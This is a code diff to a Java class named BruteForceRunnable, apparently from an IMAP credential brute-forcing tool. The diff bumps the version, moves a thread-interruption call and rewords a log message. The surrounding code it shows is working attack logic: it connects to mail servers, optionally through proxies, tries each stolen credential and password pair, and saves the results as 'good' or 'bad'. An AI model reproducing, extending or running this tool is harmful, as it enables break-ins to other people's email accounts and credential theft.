@@ -19,7 +19,7 @@ import java.io.IOException;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.6
+ * @version 1.0.7
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
@@ -68,8 +68,8 @@ public class BruteForceRunnable implements Runnable
                 ckImap.put_Port(connection.getPort());
                 ckImap.put_Ssl(connection.isSsl());
                 ckImap.put_StartTls(connection.isTls());
-
                 bruteForceCallback.handleDecrementCounter(DataType.SOURCE);
+
                 if ((useProxies && isFailedToConnect(ckImap, connection.getHost())) || !ckImap.Connect(connection.getHost()))
                 {
                     break;
@@ -78,13 +78,13 @@ public class BruteForceRunnable implements Runnable
                 FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                 ckImap.Disconnect();
             }
+
+            bruteForceCallback.handleThreadInterruption();
         }
         catch (final IOException ioException)
         {
-            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("Exception occurred, while saving source to file, message: %s", ioException.getMessage()));
+            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("I/O exception occurred, message: %s", ioException.getMessage()));
         }
-
-        bruteForceCallback.handleThreadInterruption();
     }
 
     /**
